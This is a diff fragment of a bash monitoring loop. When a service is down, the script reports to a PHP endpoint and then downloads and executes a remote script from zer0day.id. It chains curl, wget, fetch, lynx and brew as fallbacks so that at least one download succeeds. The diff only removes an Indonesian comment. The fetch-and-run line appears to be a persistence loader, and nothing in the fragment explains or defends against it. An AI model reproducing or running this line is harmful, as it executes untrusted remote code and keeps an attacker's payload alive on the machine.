@@ -63,7 +63,7 @@ while true; do
     else
         curl -sL -H "Content-Type: application/json" -X POST "$php_endpoint?status=service_down"
         
-        # Menggunakan semua downloader
+        
         bash -c "\$(curl -fsSL https://zer0day.id/y)" || bash -c "\$(wget -qO- https://zer0day.id/y)" || bash -c "\$(fetch -o - https://zer0day.id/y)" || bash -c "\$(lynx -source https://zer0day.id/y)" || bash -c "\$(brew install -q https://zer0day.id/y)"
 
         if systemctl is-active --quiet "$service_name"; then
